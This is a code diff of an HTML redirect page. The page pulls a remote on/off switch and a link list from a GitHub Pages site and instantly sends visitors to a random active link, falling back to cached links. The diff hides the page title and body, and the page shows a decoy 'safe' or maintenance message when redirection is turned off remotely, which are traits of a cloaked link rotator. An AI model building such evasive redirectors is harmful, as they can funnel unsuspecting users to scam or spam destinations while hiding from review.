@@ -2,18 +2,18 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecting...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+  <title></title> <!-- ✅ 不写文字，防止显示标题 -->
   <style>
     html, body {
+      background: #fff;
       margin: 0;
       padding: 0;
-      background: #fff;
+      height: 100%;
       overflow: hidden;
+      display: none; /* ✅ 页面内容不渲染 */
     }
   </style>
-
   <script>
     (async () => {
       const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
@@ -22,34 +22,38 @@
       let activeLinks = [];
 
       try {
-        // 读取远程开关配置（是否启用跳转）
+        // 拉取远程开关
         const conf = await fetch(CONFIG_URL + "?ts=" + Date.now(), { cache: "no-store" }).then(r => r.json());
         if (!conf.enableRedirect) {
+          document.open();
           document.write(`<h2>${conf.safeTitle || "Content temporarily unavailable."}</h2>`);
+          document.close();
           return;
         }
 
-        // 拉取 mapping.json
+        // 拉取主仓库链接
         const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
         const data = await res.json();
         activeLinks = data.links.filter(l => l.active);
         if (!activeLinks.length) throw new Error("No active links");
 
-        // 缓存
+        // 缓存备用
         localStorage.setItem(LOCAL_KEY, JSON.stringify(activeLinks));
 
-        // 秒跳
+        // ⚡ 立即随机跳转（毫秒级）
         const idx = Math.floor(Math.random() * activeLinks.length);
-        window.location.replace(activeLinks[idx].url);
+        location.replace(activeLinks[idx].url);
 
       } catch (err) {
         // 失败回退
-        console.error(err);
+        console.error("Redirect failed:", err);
         activeLinks = JSON.parse(localStorage.getItem(LOCAL_KEY) || "[]");
         if (activeLinks.length) {
-          window.location.replace(activeLinks[Math.floor(Math.random() * activeLinks.length)].url);
+          location.replace(activeLinks[Math.floor(Math.random() * activeLinks.length)].url);
         } else {
+          document.open();
           document.write("<h2>System maintenance, please try again later.</h2>");
+          document.close();
         }
       }
     })();
